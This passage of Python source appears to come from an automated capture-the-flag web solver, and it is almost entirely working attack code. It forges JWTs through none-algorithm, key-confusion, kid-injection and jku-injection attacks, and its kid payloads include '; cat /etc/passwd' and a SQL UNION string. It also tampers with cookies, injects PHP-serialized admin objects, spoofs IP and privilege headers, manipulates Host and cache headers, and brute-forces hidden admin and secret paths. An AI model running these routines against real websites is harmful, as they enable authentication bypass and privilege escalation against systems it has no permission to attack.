                try:
                    decoded = base64.b64decode(value).decode('utf-8', errors='ignore')
                    flag = self.extract_flag(decoded)
                    if flag:
                        result.add_log(f"Found Base64 encoded flag in JWT: {key}")
                        return flag
                    if CTFDecoder._looks_english(decoded) and len(decoded) > 5:
                        result.add_log(f"JWT Base64 decoded {key}: {decoded}")
                        return decoded
                except:
                    pass
                
                # Hex decode attempt
                try:
                    if re.match(r'^[0-9a-fA-F]+$', value) and len(value) % 2 == 0:
                        decoded = bytes.fromhex(value).decode('utf-8', errors='ignore')
                        flag = self.extract_flag(decoded)
                        if flag:
                            result.add_log(f"Found Hex encoded flag in JWT: {key}")
                            return flag
                except:
                    pass
            
            elif isinstance(value, dict):
                # Recursive check for nested objects
                flag = self._check_jwt_payload_for_flag(value, result)
                if flag:
                    return flag
        
        return None

    def _jwt_alg_confusion(self, token: str, alg: str, result: ChallengeResult) -> str:
        """JWT algorithm confusion attack"""
        try:
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            # Modify header algorithm
            header['alg'] = alg
            
            # Modify payload for privilege escalation
            payload['admin'] = True
            payload['isAdmin'] = True
            payload['role'] = 'admin'
            payload['user'] = 'admin'
            if 'sub' in payload:
                payload['sub'] = 'admin'
            
            # Encode new token
            new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            # For 'none' algorithm, signature is empty
            return f"{new_header}.{new_payload}."
        except:
            return None
    
    def _jwt_rs_to_hs_attack(self, token: str, url: str, result: ChallengeResult) -> str:
        """JWT RS256 to HS256 algorithm switch attack"""
        try:
            # This attack uses the public key as HMAC secret
            # In real scenarios, we'd need to fetch the public key
            result.add_log("Attempting RS256 to HS256 attack...")
            
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            # Change algorithm
            header['alg'] = 'HS256'
            payload['admin'] = True
            payload['role'] = 'admin'
            
            new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            # Try with empty signature first
            return f"{new_header}.{new_payload}."
        except:
            return None

    def _jwt_forge_with_secret(self, token: str, secret: str, original_payload: dict, result: ChallengeResult) -> str:
        """Forge JWT with a guessed secret"""
        try:
            import jwt as pyjwt
            
            # Create modified payload
            new_payload = original_payload.copy()
            new_payload['admin'] = True
            new_payload['isAdmin'] = True
            new_payload['role'] = 'admin'
            new_payload['user'] = 'admin'
            if 'sub' in new_payload:
                new_payload['sub'] = 'admin'
            if 'exp' in new_payload:
                # Extend expiration
                new_payload['exp'] = int(time.time()) + 86400 * 365
            
            # Try to sign with the secret
            new_token = pyjwt.encode(new_payload, secret, algorithm='HS256')
            return new_token
        except:
            return None
    
    def _jwt_kid_injection(self, token: str, result: ChallengeResult) -> str:
        """JWT Key ID (kid) injection attack"""
        try:
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            # KID injection payloads
            kid_payloads = [
                '../../../dev/null',
                '/dev/null',
                '../../../../../../dev/null',
                "' UNION SELECT 'secret' --",
                '; cat /etc/passwd',
            ]
            
            for kid in kid_payloads:
                header['kid'] = kid
                header['alg'] = 'HS256'
                payload['admin'] = True
                
                new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                
                # Sign with empty key (for /dev/null)
                try:
                    import hmac
                    import hashlib
                    signature = base64.urlsafe_b64encode(
                        hmac.new(b'', f"{new_header}.{new_payload}".encode(), hashlib.sha256).digest()
                    ).decode().rstrip('=')
                    return f"{new_header}.{new_payload}.{signature}"
                except:
                    pass
        except:
            pass
        return None
    
    def _jwt_jku_injection(self, token: str, url: str, result: ChallengeResult) -> str:
        """JWT JKU/X5U header injection"""
        try:
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            # Add JKU pointing to attacker-controlled URL
            header['jku'] = f"{url}/.well-known/jwks.json"
            header['alg'] = 'RS256'
            payload['admin'] = True
            
            new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            return f"{new_header}.{new_payload}."
        except:
            return None

    def _test_jwt_token(self, url: str, source: str, token: str, result: ChallengeResult) -> str:
        """Test a modified JWT token"""
        try:
            # Determine where to inject the token
            if source.startswith('cookie:'):
                cookie_name = source.split(':')[1]
                self.session.cookies.set(cookie_name, token)
                response = self.session.get(url, timeout=5)
            elif source.startswith('header:'):
                header_name = source.split(':')[1]
                headers = {header_name: f"Bearer {token}" if 'auth' in header_name.lower() else token}
                response = self.session.get(url, headers=headers, timeout=5)
            else:
                # Try both cookie and header
                self.session.cookies.set('token', token)
                response = self.session.get(url, headers={'Authorization': f'Bearer {token}'}, timeout=5)
            
            flag = self.extract_flag(response.text)
            if flag:
                return flag
            
            # Check for success indicators
            if any(kw in response.text.lower() for kw in ['admin', 'dashboard', 'welcome admin', 'flag', 'secret']):
                flag = self.extract_flag(response.text)
                if flag:
                    return flag
        except:
            pass
        return None
    
    # ==================== ULTRA ENHANCED BASE64 ATTACKS ====================
    
    def _ultra_base64_attack(self, url: str, result: ChallengeResult) -> str:
        """ULTRA ENHANCED Base64 detection and decoding"""
        result.add_log("Running ULTRA Base64 attack suite...")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Find ALL Base64 strings
            b64_strings = self._find_all_base64(response.text, result)
            
            for source, b64_str in b64_strings:
                result.add_log(f"Found Base64 from {source}: {b64_str[:30]}...")
                
                # Try multi-layer decoding
                flag = self._decode_base64_chain(b64_str, result)
                if flag:
                    return flag
                
                # Try Base64 + Hash cracking
                flag = self._base64_hash_crack(b64_str, result)
                if flag:
                    return flag
                
                # Try Base64 + XOR
                flag = self._base64_xor_decode(b64_str, result)
                if flag:
                    return flag
        except Exception as e:
            result.add_log(f"Base64 attack error: {e}")
        
        return None

    def _find_all_base64(self, content: str, result: ChallengeResult) -> list:
        """Find ALL Base64 strings from content"""
        b64_strings = []
        
        # Pattern for Base64 (min 8 chars)
        patterns = [
            (r'[\'"]([A-Za-z0-9+/]{8,}={0,2})[\'"]', 'string'),
            (r'data:[\w/]+;base64,([A-Za-z0-9+/]+=*)', 'data-uri'),
            (r'base64[:\s]+[\'"]?([A-Za-z0-9+/]{8,}={0,2})', 'labeled'),
            (r'encoded[:\s]+[\'"]?([A-Za-z0-9+/]{8,}={0,2})', 'encoded'),
            (r'token[:\s]+[\'"]?([A-Za-z0-9+/]{8,}={0,2})', 'token'),
        ]
        
        for pattern, source in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match) >= 8 and match not in [m[1] for m in b64_strings]:
                    # Validate it's likely Base64
                    try:
                        decoded = base64.b64decode(match + '==')
                        if decoded:
                            b64_strings.append((source, match))
                    except:
                        pass
        
        result.add_log(f"Found {len(b64_strings)} Base64 strings")
        return b64_strings
    
    def _decode_base64_chain(self, b64_str: str, result: ChallengeResult) -> str:
        """Decode multi-layer Base64 chains"""
        decoded = b64_str
        
        for layer in range(10):  # Max 10 layers
            try:
                # Add padding if needed
                padded = decoded + '=' * (4 - len(decoded) % 4) if len(decoded) % 4 else decoded
                new_decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                
                if not new_decoded or new_decoded == decoded:
                    break
                
                decoded = new_decoded
                result.add_log(f"Base64 layer {layer + 1}: {decoded[:50]}...")
                
                # Check for flag
                flag = self.extract_flag(decoded)
                if flag:
                    result.add_log(f"Found flag after {layer + 1} Base64 layers")
                    return flag
                
                # Check if it looks like readable text
                if CTFDecoder._looks_english(decoded) and len(decoded) > 5:
                    return decoded
            except:
                break
        
        return None
    
    def _base64_hash_crack(self, b64_str: str, result: ChallengeResult) -> str:
        """Decode Base64 and crack if it's a hash"""
        try:
            decoded = base64.b64decode(b64_str + '==').decode('utf-8', errors='ignore').strip()
            
            # Check if decoded is a hash
            if re.match(r'^[a-f0-9]{32}$', decoded.lower()):
                result.add_log(f"Found Base64-encoded MD5: {decoded}")
                cracked = CTFDecoder.crack_hash(decoded, 'md5')
                if cracked:
                    result.add_log(f"Cracked Base64-MD5: {cracked}")
                    return cracked
            
            elif re.match(r'^[a-f0-9]{40}$', decoded.lower()):
                result.add_log(f"Found Base64-encoded SHA1: {decoded}")
                cracked = CTFDecoder.crack_hash(decoded, 'sha1')
                if cracked:
                    return cracked
            
            elif re.match(r'^[a-f0-9]{64}$', decoded.lower()):
                result.add_log(f"Found Base64-encoded SHA256: {decoded}")
                cracked = CTFDecoder.crack_hash(decoded, 'sha256')
                if cracked:
                    return cracked
        except:
            pass
        return None
    
    def _base64_xor_decode(self, b64_str: str, result: ChallengeResult) -> str:
        """Decode Base64 and try XOR decoding"""
        try:
            decoded_bytes = base64.b64decode(b64_str + '==')
            
            # Try common XOR keys
            for key in [0x20, 0x41, 0x42, 0x55, 0xAA, 0xFF, 77, 13, 7, 42]:
                try:
                    xored = bytes([b ^ key for b in decoded_bytes]).decode('utf-8', errors='ignore')
                    flag = self.extract_flag(xored)
                    if flag:
                        result.add_log(f"Found flag with Base64+XOR (key={key})")
                        return flag
                    if CTFDecoder._looks_english(xored) and len(xored) > 5:
                        result.add_log(f"Base64+XOR decoded (key={key}): {xored}")
                        return xored
                except:
                    pass
        except:
            pass
        return None

    # ==================== ULTRA ENHANCED COOKIE ATTACKS ====================
    
    def _ultra_cookie_attack(self, url: str, result: ChallengeResult) -> str:
        """ULTRA ENHANCED Cookie manipulation attacks"""
        result.add_log("Running ULTRA Cookie attack suite...")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # ATTACK 1: Analyze existing cookies
            for cookie in self.session.cookies:
                flag = self._analyze_cookie_deep(cookie, result)
                if flag:
                    return flag
            
            # ATTACK 2: Cookie injection with all admin values
            for cookie_name, cookie_value in self.COOKIE_ADMIN_VALUES:
                flag = self._test_cookie_injection(url, cookie_name, cookie_value, result)
                if flag:
                    return flag
            
            # ATTACK 3: Cookie tampering (modify existing)
            for cookie in list(self.session.cookies):
                flag = self._tamper_cookie(url, cookie, result)
                if flag:
                    return flag
            
            # ATTACK 4: Cookie serialization attacks
            flag = self._cookie_serialization_attack(url, result)
            if flag:
                return flag
            
            # ATTACK 5: Cookie path/domain manipulation
            flag = self._cookie_scope_attack(url, result)
            if flag:
                return flag
            
        except Exception as e:
            result.add_log(f"Cookie attack error: {e}")
        
        return None
    
    def _analyze_cookie_deep(self, cookie, result: ChallengeResult) -> str:
        """Deep analysis of a single cookie"""
        value = cookie.value
        
        # Check for flag directly
        flag = self.extract_flag(value)
        if flag:
            return flag
        
        # Try all decodings
        decodings = [
            ('base64', lambda v: base64.b64decode(v + '==').decode('utf-8', errors='ignore')),
            ('url', lambda v: urllib.parse.unquote(v)),
            ('hex', lambda v: bytes.fromhex(v).decode('utf-8', errors='ignore')),
            ('rot13', lambda v: codecs.decode(v, 'rot_13')),
        ]
        
        for name, decoder in decodings:
            try:
                decoded = decoder(value)
                flag = self.extract_flag(decoded)
                if flag:
                    result.add_log(f"Found {name} encoded flag in cookie: {cookie.name}")
                    return flag
                if CTFDecoder._looks_english(decoded) and len(decoded) > 5:
                    result.add_log(f"Cookie {cookie.name} {name} decoded: {decoded}")
                    return decoded
            except:
                pass
        
        # Check if it's a hash
        if re.match(r'^[a-f0-9]{32}$', value.lower()):
            cracked = CTFDecoder.crack_hash(value, 'md5')
            if cracked:
                result.add_log(f"Cracked MD5 cookie {cookie.name}: {cracked}")
                return cracked
        
        # Check if it's JWT
        if self._is_jwt(value):
            jwt_data = CTFDecoder.decode_jwt(value)
            if jwt_data:
                flag = self._check_jwt_payload_for_flag(jwt_data.get('payload', {}), result)
                if flag:
                    return flag
        
        return None

    def _test_cookie_injection(self, url: str, name: str, value: str, result: ChallengeResult) -> str:
        """Test cookie injection"""
        try:
            self.session.cookies.set(name, value)
            response = self.session.get(url, timeout=5)
            
            flag = self.extract_flag(response.text)
            if flag:
                result.add_log(f"Cookie injection successful: {name}={value}")
                return flag
            
            # Check for privilege escalation indicators
            if any(kw in response.text.lower() for kw in ['admin', 'dashboard', 'secret', 'flag', 'welcome']):
                flag = self.extract_flag(response.text)
                if flag:
                    return flag
        except:
            pass
        finally:
            self.session.cookies.pop(name, None)
        return None
    
    def _tamper_cookie(self, url: str, cookie, result: ChallengeResult) -> str:
        """Tamper with existing cookie values"""
        original = cookie.value
        
        # Tampering strategies
        tamper_values = []
        
        # Boolean flips
        if original.lower() in ['false', '0', 'no', 'off']:
            tamper_values.extend(['true', '1', 'yes', 'on', 'True', 'TRUE'])
        elif original.lower() in ['true', '1', 'yes', 'on']:
            tamper_values.extend(['false', '0', 'no', 'off'])
        
        # Role escalation
        if original.lower() in ['user', 'guest', 'member', 'normal']:
            tamper_values.extend(['admin', 'administrator', 'root', 'superuser', 'moderator'])
        
        # Numeric manipulation
        if original.isdigit():
            num = int(original)
            tamper_values.extend([str(num + 1), str(num - 1), '0', '1', '999', '-1', '9999999'])
        
        # ID manipulation
        if re.match(r'^\d+$', original):
            tamper_values.extend(['1', '0', '-1', str(int(original) - 1)])
        
        # Base64 encoded admin
        tamper_values.extend([
            base64.b64encode(b'admin').decode(),
            base64.b64encode(b'true').decode(),
            base64.b64encode(b'{"admin":true}').decode(),
        ])
        
        for tamper_value in tamper_values:
            try:
                self.session.cookies.set(cookie.name, tamper_value)
                response = self.session.get(url, timeout=5)
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log(f"Cookie tamper successful: {cookie.name}={tamper_value}")
                    return flag
            except:
                pass
            finally:
                self.session.cookies.set(cookie.name, original)
        
        return None
    
    def _cookie_serialization_attack(self, url: str, result: ChallengeResult) -> str:
        """Test for serialization vulnerabilities in cookies"""
        # PHP serialization payloads
        php_payloads = [
            'O:4:"User":1:{s:5:"admin";b:1;}',
            'a:1:{s:5:"admin";b:1;}',
            'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}',
        ]
        
        for payload in php_payloads:
            try:
                # Try raw and base64 encoded
                for value in [payload, base64.b64encode(payload.encode()).decode()]:
                    self.session.cookies.set('session', value)
                    self.session.cookies.set('user', value)
                    response = self.session.get(url, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Serialization attack successful")
                        return flag
            except:
                pass
        
        return None
    
    def _cookie_scope_attack(self, url: str, result: ChallengeResult) -> str:
        """Test cookie scope manipulation"""
        parsed = urlparse(url)
        
        # Try accessing admin paths with manipulated cookies
        admin_paths = ['/admin', '/dashboard', '/flag', '/secret', '/api/admin']
        
        for path in admin_paths:
            try:
                admin_url = f"{parsed.scheme}://{parsed.netloc}{path}"
                response = self.session.get(admin_url, timeout=5)
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log(f"Found flag at {path} with current cookies")
                    return flag
            except:
                pass
        
        return None

    # ==================== ULTRA ENHANCED HEADER ATTACKS ====================
    
    def _ultra_header_attack(self, url: str, result: ChallengeResult) -> str:
        """ULTRA ENHANCED Header manipulation attacks"""
        result.add_log("Running ULTRA Header attack suite...")
        
        try:
            # ATTACK 1: IP spoofing headers
            flag = self._header_ip_spoofing(url, result)
            if flag:
                return flag
            
            # ATTACK 2: Admin/privilege headers
            flag = self._header_privilege_escalation(url, result)
            if flag:
                return flag
            
            # ATTACK 3: Host header attacks
            flag = self._header_host_attack(url, result)
            if flag:
                return flag
            
            # ATTACK 4: HTTP method override
            flag = self._header_method_override(url, result)
            if flag:
                return flag
            
            # ATTACK 5: Content-Type manipulation
            flag = self._header_content_type_attack(url, result)
            if flag:
                return flag
            
            # ATTACK 6: Cache poisoning headers
            flag = self._header_cache_poisoning(url, result)
            if flag:
                return flag
            
        except Exception as e:
            result.add_log(f"Header attack error: {e}")
        
        return None
    
    def _header_ip_spoofing(self, url: str, result: ChallengeResult) -> str:
        """IP spoofing via headers"""
        ip_headers = {
            'X-Forwarded-For': ['127.0.0.1', '192.168.1.1', '10.0.0.1', 'localhost', '::1'],
            'X-Real-IP': ['127.0.0.1', '192.168.1.1', '10.0.0.1'],
            'X-Originating-IP': ['127.0.0.1', '[127.0.0.1]'],
            'X-Remote-IP': ['127.0.0.1'],
            'X-Client-IP': ['127.0.0.1'],
            'X-Remote-Addr': ['127.0.0.1'],
            'CF-Connecting-IP': ['127.0.0.1'],
            'True-Client-IP': ['127.0.0.1'],
            'Forwarded': ['for=127.0.0.1', 'for="127.0.0.1"'],
        }
        
        for header, values in ip_headers.items():
            for value in values:
                try:
                    response = self.session.get(url, headers={header: value}, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"IP spoofing successful: {header}={value}")
                        return flag
                except:
                    pass
        
        return None
    
    def _header_privilege_escalation(self, url: str, result: ChallengeResult) -> str:
        """Privilege escalation via headers"""
        priv_headers = {
            'X-Admin': ['true', '1', 'yes'],
            'X-Role': ['admin', 'administrator', 'superuser'],
            'X-User': ['admin', 'root'],
            'X-Auth': ['true', 'admin'],
            'X-Authenticated': ['true', '1'],
            'X-Access-Level': ['admin', '999', 'root'],
            'X-Privilege': ['admin', 'elevated'],
            'X-Internal': ['true', '1'],
            'X-Debug': ['true', '1'],
            'X-Custom-Auth': ['admin', 'true'],
            'Admin': ['true', '1'],
            'Role': ['admin'],
            'Is-Admin': ['true', '1'],
        }
        
        for header, values in priv_headers.items():
            for value in values:
                try:
                    response = self.session.get(url, headers={header: value}, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Privilege escalation: {header}={value}")
                        return flag
                    
                    # Check for admin access indicators
                    if 'admin' in response.text.lower() or 'dashboard' in response.text.lower():
                        flag = self.extract_flag(response.text)
                        if flag:
                            return flag
                except:
                    pass
        
        return None

    def _header_host_attack(self, url: str, result: ChallengeResult) -> str:
        """Host header manipulation attacks"""
        parsed = urlparse(url)
        
        host_values = [
            'localhost', '127.0.0.1', 'admin.local', 'internal',
            'dev.local', 'staging.local', 'admin', 'backend',
            f'admin.{parsed.netloc}', f'internal.{parsed.netloc}',
            f'{parsed.netloc}:8080', f'{parsed.netloc}:443',
        ]
        
        for host in host_values:
            try:
                response = self.session.get(url, headers={'Host': host}, timeout=5)
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log(f"Host header attack: {host}")
                    return flag
            except:
                pass
        
        # X-Forwarded-Host attack
        for host in host_values:
            try:
                response = self.session.get(url, headers={'X-Forwarded-Host': host}, timeout=5)
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log(f"X-Forwarded-Host attack: {host}")
                    return flag
            except:
                pass
        
        return None
    
    def _header_method_override(self, url: str, result: ChallengeResult) -> str:
        """HTTP method override attacks"""
        override_headers = {
            'X-HTTP-Method-Override': ['PUT', 'DELETE', 'PATCH', 'OPTIONS', 'ADMIN'],
            'X-HTTP-Method': ['PUT', 'DELETE', 'PATCH'],
            'X-Method-Override': ['PUT', 'DELETE', 'ADMIN'],
        }
        
        for header, methods in override_headers.items():
            for method in methods:
                try:
                    response = self.session.get(url, headers={header: method}, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Method override: {header}={method}")
                        return flag
                except:
                    pass
        
        return None
    
    def _header_content_type_attack(self, url: str, result: ChallengeResult) -> str:
        """Content-Type manipulation attacks"""
        content_types = [
            'application/json',
            'application/xml',
            'text/xml',
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/plain',
        ]
        
        for ct in content_types:
            try:
                # POST with different content types
                response = self.session.post(url, headers={'Content-Type': ct}, 
                                            data='{"admin":true}', timeout=5)
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log(f"Content-Type attack: {ct}")
                    return flag
            except:
                pass
        
        return None
    
    def _header_cache_poisoning(self, url: str, result: ChallengeResult) -> str:
        """Cache poisoning via headers"""
        cache_headers = {
            'X-Original-URL': ['/admin', '/flag', '/secret'],
            'X-Rewrite-URL': ['/admin', '/flag', '/secret'],
            'X-Custom-IP-Authorization': ['127.0.0.1'],
            'X-Forwarded-Scheme': ['https', 'admin'],
            'X-Forwarded-Proto': ['https', 'admin'],
        }
        
        for header, values in cache_headers.items():
            for value in values:
                try:
                    response = self.session.get(url, headers={header: value}, timeout=5)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Cache poisoning: {header}={value}")
                        return flag
                except:
                    pass
        
        return None

    # ==================== ULTRA ENHANCED HIDDEN URL/PATH CTF ATTACKS ====================
    
    def _ultra_hidden_url_attack(self, url: str, result: ChallengeResult) -> str:
        """ULTRA ENHANCED Hidden URL/Path discovery for CTF challenges"""
        result.add_log("Running ULTRA Hidden URL attack suite...")
        
        try:
            # ATTACK 1: Smart path extraction from page content
            flag = self._extract_paths_from_content(url, result)
            if flag:
                return flag
            
            # ATTACK 2: JavaScript path mining
            flag = self._mine_js_paths(url, result)
            if flag:
                return flag
            
            # ATTACK 3: Comment path extraction
            flag = self._extract_comment_paths(url, result)
            if flag:
                return flag
            
            # ATTACK 4: CTF-specific path bruteforce
            flag = self._ctf_path_bruteforce(url, result)
            if flag:
                return flag
            
            # ATTACK 5: Encoded path discovery
            flag = self._encoded_path_discovery(url, result)
            if flag:
                return flag
            
            # ATTACK 6: Path traversal for flags
            flag = self._path_traversal_attack(url, result)
            if flag:
                return flag
            
            # ATTACK 7: Hidden directory discovery
            flag = self._hidden_directory_discovery(url, result)
            if flag:
                return flag
            
            # ATTACK 8: File extension fuzzing
            flag = self._extension_fuzzing(url, result)
            if flag:
                return flag
            
        except Exception as e:
            result.add_log(f"Hidden URL attack error: {e}")
        
        return None

    def _extract_paths_from_content(self, url: str, result: ChallengeResult) -> str:
        """Extract hidden paths from page content intelligently"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            base_url = url.rstrip('/')
            
            # Pattern 1: Find paths in data attributes
            data_attrs = ['data-url', 'data-path', 'data-src', 'data-href', 'data-link',
                         'data-file', 'data-page', 'data-route', 'data-endpoint', 'data-api']
            for attr in data_attrs:
                for elem in soup.find_all(attrs={attr: True}):
                    path = elem.get(attr)
                    if path:
                        flag = self._check_path_for_flag(base_url, path, result)
                        if flag:
                            return flag
            
            # Pattern 2: Find paths in onclick/onload handlers
            event_attrs = ['onclick', 'onload', 'onsubmit', 'onchange', 'onfocus']
            for attr in event_attrs:
                for elem in soup.find_all(attrs={attr: True}):
                    handler = elem.get(attr)
                    paths = re.findall(r'["\']([/][a-zA-Z0-9_\-./]+)["\']', handler)
                    for path in paths:
                        flag = self._check_path_for_flag(base_url, path, result)
                        if flag:
                            return flag
            
            # Pattern 3: Find paths in meta tags
            for meta in soup.find_all('meta'):
                content = meta.get('content', '')
                paths = re.findall(r'url=([^\s;]+)', content, re.I)
                for path in paths:
                    flag = self._check_path_for_flag(base_url, path, result)
                    if flag:
                        return flag
            
            # Pattern 4: Find paths in link tags (not just stylesheets)
            for link in soup.find_all('link'):
                href = link.get('href', '')
                if href and not href.endswith('.css'):
                    flag = self._check_path_for_flag(base_url, href, result)
                    if flag:
                        return flag
        except:
            pass
        return None

    def _mine_js_paths(self, url: str, result: ChallengeResult) -> str:
        """Deep mine JavaScript files for hidden paths"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            base_url = url.rstrip('/')
            
            all_paths = set()
            
            # Collect all JS content
            js_content = ""
            
            # Inline scripts
            for script in soup.find_all('script'):
                if script.string:
                    js_content += script.string + "\n"
            
            # External scripts
            for script in soup.find_all('script', src=True):
                try:
                    js_url = urljoin(url, script['src'])
                    js_response = self.session.get(js_url, timeout=5)
                    if js_response.status_code == 200:
                        js_content += js_response.text + "\n"
                except:
                    pass
            
            # Advanced path extraction patterns
            path_patterns = [
                r'["\']([/][a-zA-Z0-9_\-./]+)["\']',  # Basic paths
                r'path\s*[=:]\s*["\']([^"\']+)["\']',  # path = "..."
                r'url\s*[=:]\s*["\']([^"\']+)["\']',   # url = "..."
                r'href\s*[=:]\s*["\']([^"\']+)["\']',  # href = "..."
                r'src\s*[=:]\s*["\']([^"\']+)["\']',   # src = "..."
                r'endpoint\s*[=:]\s*["\']([^"\']+)["\']',  # endpoint = "..."
                r'route\s*[=:]\s*["\']([^"\']+)["\']',  # route = "..."
                r'api\s*[=:]\s*["\']([^"\']+)["\']',   # api = "..."
                r'fetch\s*\(\s*["\']([^"\']+)["\']',   # fetch("...")
                r'\.get\s*\(\s*["\']([^"\']+)["\']',   # .get("...")
                r'\.post\s*\(\s*["\']([^"\']+)["\']',  # .post("...")
                r'location\s*=\s*["\']([^"\']+)["\']', # location = "..."
                r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
                r'redirect\s*[=:]\s*["\']([^"\']+)["\']',
                r'navigate\s*\(\s*["\']([^"\']+)["\']',
                r'router\.push\s*\(\s*["\']([^"\']+)["\']',
            ]
            
            for pattern in path_patterns:
                matches = re.findall(pattern, js_content, re.I)
                all_paths.update(matches)
            
            # Check each discovered path
            for path in all_paths:
                if path.startswith('/') or path.startswith('./') or path.startswith('../'):
                    flag = self._check_path_for_flag(base_url, path, result)
                    if flag:
                        return flag
        except:
            pass
        return None

    def _extract_comment_paths(self, url: str, result: ChallengeResult) -> str:
        """Extract paths from HTML/JS/CSS comments"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            base_url = url.rstrip('/')
            
            # HTML comments
            html_comments = re.findall(r'<!--(.*?)-->', response.text, re.DOTALL)
            
            # JS comments
            js_comments = re.findall(r'//[^\n]*|/\*.*?\*/', response.text, re.DOTALL)
            
            all_comments = html_comments + js_comments
            
            for comment in all_comments:
                # Look for paths in comments
                paths = re.findall(r'[/][a-zA-Z0-9_\-./]+', comment)
                for path in paths:
                    if len(path) > 1 and not path.startswith('//'):
                        flag = self._check_path_for_flag(base_url, path, result)
                        if flag:
                            return flag
                
                # Look for hints about paths
                hint_patterns = [
                    r'(?:path|url|file|page|route|endpoint|secret|hidden|flag)\s*[=:]\s*["\']?([^\s"\'<>]+)',
                    r'(?:check|try|visit|go to|look at)\s+["\']?([/][^\s"\'<>]+)',
                    r'([/][a-zA-Z0-9_\-]+(?:/[a-zA-Z0-9_\-]+)*(?:\.[a-zA-Z0-9]+)?)',
                ]
                for pattern in hint_patterns:
                    matches = re.findall(pattern, comment, re.I)
                    for match in matches:
                        if match.startswith('/'):
                            flag = self._check_path_for_flag(base_url, match, result)
                            if flag:
                                return flag
        except:
            pass
        return None

    # CTF-specific paths - comprehensive list
    CTF_PATHS = [
        # Flag variations
        '/flag', '/Flag', '/FLAG', '/flag.txt', '/Flag.txt', '/FLAG.txt',
        '/flag.html', '/flag.php', '/flag.json', '/flag.xml', '/flag.md',
        '/flags', '/flags.txt', '/the-flag', '/theflag', '/get-flag', '/getflag',
        '/capture-the-flag', '/ctf-flag', '/find-flag', '/show-flag',
        
        # Secret variations
        '/secret', '/Secret', '/SECRET', '/secret.txt', '/secret.html', '/secret.php',
        '/secrets', '/secrets.txt', '/the-secret', '/thesecret', '/hidden-secret',
        '/top-secret', '/topsecret', '/super-secret', '/supersecret',
        
        # Hidden variations
        '/hidden', '/Hidden', '/HIDDEN', '/hidden.txt', '/hidden.html', '/hidden.php',
        '/hide', '/hid', '/.hidden', '/..hidden', '/hidden-page', '/hidden-file',
        
        # Admin variations
        '/admin', '/Admin', '/ADMIN', '/admin.txt', '/admin.html', '/admin.php',
        '/administrator', '/admin-panel', '/adminpanel', '/admin-page',
        '/admin/flag', '/admin/secret', '/admin/hidden',
        
        # Private/Internal
        '/private', '/Private', '/PRIVATE', '/private.txt', '/private.html',
        '/internal', '/Internal', '/INTERNAL', '/internal.txt',
        '/restricted', '/Restricted', '/confidential', '/Confidential',
        
        # Key/Password
        '/key', '/Key', '/KEY', '/key.txt', '/key.html', '/key.php',
        '/password', '/Password', '/PASSWORD', '/password.txt',
        '/credentials', '/creds', '/auth', '/token', '/tokens',
        
        # Hint/Clue
        '/hint', '/Hint', '/HINT', '/hint.txt', '/hint.html',
        '/clue', '/Clue', '/CLUE', '/clue.txt', '/clue.html',
        '/answer', '/Answer', '/ANSWER', '/answer.txt',
        '/solution', '/Solution', '/SOLUTION', '/solution.txt',
        
        # Data/Files
        '/data', '/Data', '/DATA', '/data.txt', '/data.json', '/data.xml',
        '/file', '/File', '/FILE', '/files', '/Files', '/FILES',
        '/download', '/Download', '/downloads', '/Downloads',
        '/upload', '/Upload', '/uploads', '/Uploads',
        
        # Goal/Target (CTF specific)
        '/goal', '/Goal', '/GOAL', '/goal.txt', '/goal.html',
        '/target', '/Target', '/TARGET', '/target.txt',
        '/mission', '/Mission', '/MISSION', '/mission.txt',
        '/objective', '/Objective', '/objective.txt',
        '/challenge', '/Challenge', '/CHALLENGE', '/challenge.txt',
        
        # Common CTF directories
        '/download/flag.txt', '/download/secret.txt', '/download/goal.txt',
        '/files/flag.txt', '/files/secret.txt', '/files/hidden.txt',
        '/data/flag.txt', '/data/secret.txt', '/data/hidden.txt',
        '/static/flag.txt', '/static/secret.txt', '/static/hidden.txt',
        '/assets/flag.txt', '/assets/secret.txt', '/assets/hidden.txt',
        '/public/flag.txt', '/public/secret.txt', '/public/hidden.txt',
